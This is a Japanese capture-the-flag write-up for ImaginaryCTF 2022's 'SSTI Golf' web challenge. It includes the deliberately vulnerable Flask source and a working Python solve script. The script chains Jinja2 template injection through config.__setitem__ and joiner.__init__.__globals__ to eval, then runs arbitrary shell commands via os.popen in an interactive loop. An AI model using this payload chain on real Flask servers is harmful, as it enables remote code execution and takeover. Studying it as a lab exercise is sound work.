---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: SSTI Golf
genre: web
solved_date: 2022-07-17
during_ctf: true
tag: [flask,ssti]
fav: false
difficulty: easy
---

### 概要

SSTI できる flask のアプリケーションが与えられる。ペイロードは48 文字以下しか許可されていない。

<details><summary>コード</summary>

```py
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response

app = Flask(__name__)

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/ssti')
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'
    if len(query) > 48:
        return "Too long!"
    return render_template_string(query)

app.run('0.0.0.0', 1337)
```

</details>


### 解法

まず、 `{{self._TemplateReference__context}}` というペイロードを送って有用なオブジェクトを探した。その結果、`joiner` というオブジェクトがクラスであることが分かった。これを用いれば、`{{joiner.__init__.__globals__.__builtins__.eval(request.arg.q)}}` といった形で任意コード実行ができるはずである。このままでは文字数が長すぎるため、`config.__setitem__` を用いて式の途中経過を逐次保存することで制限をバイパスした。。

<details><summary>スクリプト</summary>

```py
import requests

def send(query, **kwargs):
  req = requests.get(
    "http://sstigolf.chal.imaginaryctf.org/ssti",
    {
      "query": '{{' + query + '}}',
      **kwargs
    }
  )
  return req.text

send("config.__setitem__('s','__setitem__')")
send("config[config.s]('a',joiner.__init__)")
send("config[config.s]('a',config.a.__globals__)")
send("config[config.s]('a',config.a.__builtins__)")
while True:
  print(send("config.a.eval(request.args.q)", q=f"__import__('os').popen('{input('> ')}').read()"))
```

</details>

